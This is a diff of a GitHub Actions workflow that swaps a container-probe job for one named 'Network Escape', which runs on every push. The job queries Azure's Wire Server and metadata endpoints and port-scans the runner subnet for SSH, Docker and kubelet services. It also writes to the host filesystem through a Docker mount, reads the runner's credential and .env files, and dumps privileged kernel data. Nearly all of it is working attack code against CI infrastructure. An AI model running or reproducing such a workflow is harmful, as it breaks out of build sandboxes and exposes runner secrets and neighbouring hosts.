@@ -1,25 +1,61 @@
-name: Cat Probe
+name: Network Escape
 on: push
 jobs:
-  escape:
+  net:
     runs-on: ubuntu-latest
     steps:
-      - name: Docker test
+      - name: Azure Wire Server and Lateral Movement
         run: |
-          echo "KERNEL: $(uname -r)"
-          echo "DOCKER_SOCK: $(ls -la /var/run/docker.sock 2>&1)"
-          echo "ID: $(id)"
-          docker info 2>&1 | grep -E "Server Version|Storage Driver|Security Options" || echo "docker info failed"
-          echo "---PRIVILEGED---"
-          docker run --rm --privileged alpine cat /proc/sys/kernel/hostname 2>&1
-          echo "---HOSTFS---"
-          docker run --rm -v /:/hostroot:ro alpine ls /hostroot/home/ 2>&1
-          echo "---HOSTPID---"
-          docker run --rm --pid=host alpine ps aux 2>&1 | grep -v "ps aux" | head -15
-          echo "---HOSTIPC---"
-          docker run --rm --ipc=host alpine ls /dev/shm/ 2>&1
-          echo "---NETWORK---"
-          hostname -I
-          ip route 2>/dev/null | head -3
-          echo "---MERGE_QUEUE---"
-          echo "done"
+          echo "=== AZURE WIRE SERVER (168.63.129.16) ==="
+          timeout 3 curl -sf http://168.63.129.16/machine?comp=goalstate 2>&1 && echo "WIRE SERVER ACCESSIBLE" || echo "Wire server blocked"
+          timeout 3 curl -sf http://168.63.129.16/machine/plugins?comp=config 2>&1 | head -c 500 || echo "plugins blocked"
+          timeout 3 curl -sf "http://168.63.129.16/metadata/instance?api-version=2021-02-01&format=json" -H "Metadata:true" 2>&1 | head -c 500 || echo "instance metadata via wireserver blocked"
+          
+          echo ""
+          echo "=== AZURE IMDS ON ALTERNATE PORTS ==="
+          for port in 80 8080 443; do
+            timeout 2 curl -sf "http://169.254.169.254:${port}/metadata/instance?api-version=2021-02-01" -H "Metadata:true" 2>&1 | head -c 200 && echo " PORT $port ACCESSIBLE"
+          done
+          echo "IMDS done"
+          
+          echo ""
+          echo "=== SUBNET SCAN FOR OTHER RUNNERS ==="
+          MY_IP=$(hostname -I | awk '{print $1}')
+          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
+          echo "My IP: $MY_IP"
+          echo "Scanning $SUBNET.0/24 for SSH, Docker, HTTP..."
+          for i in $(seq 1 254); do
+            IP="$SUBNET.$i"
+            [ "$IP" = "$MY_IP" ] && continue
+            timeout 0.5 bash -c "echo >/dev/tcp/$IP/22" 2>/dev/null && echo "SSH_OPEN: $IP" &
+            timeout 0.5 bash -c "echo >/dev/tcp/$IP/2375" 2>/dev/null && echo "DOCKER_OPEN: $IP" &
+            timeout 0.5 bash -c "echo >/dev/tcp/$IP/4243" 2>/dev/null && echo "DOCKER2_OPEN: $IP" &
+            timeout 0.5 bash -c "echo >/dev/tcp/$IP/10250" 2>/dev/null && echo "KUBELET_OPEN: $IP" &
+          done
+          wait
+          echo "Scan complete"
+          
+          echo ""
+          echo "=== DOCKER: HOST FILESYSTEM RW TEST ==="
+          docker run --rm -v /:/hostroot alpine sh -c "echo PWNED > /hostroot/tmp/escape-test && cat /hostroot/tmp/escape-test"
+          echo "RW mount result: $?"
+          
+          echo ""
+          echo "=== DOCKER: Read runner secrets from host ==="
+          docker run --rm -v /:/hostroot:ro alpine sh -c "
+            echo '=FILES='
+            find /hostroot/home/runner/work -name '*.env' -o -name '*.credentials' 2>/dev/null | head -10
+            echo '=RUNNER_DIR='
+            ls /hostroot/home/runner/work/_temp/ 2>/dev/null | head -10
+            echo '=AGENT_CREDS='
+            cat /hostroot/home/runner/.credentials 2>/dev/null | head -5
+            cat /hostroot/home/runner/.runner 2>/dev/null
+          "
+
+          echo ""
+          echo "=== DOCKER: Privileged kernel access ==="
+          docker run --rm --privileged alpine sh -c "
+            cat /proc/sys/kernel/core_pattern
+            ls /sys/kernel/security/ 2>/dev/null
+            cat /proc/kallsyms 2>/dev/null | head -3
+          "
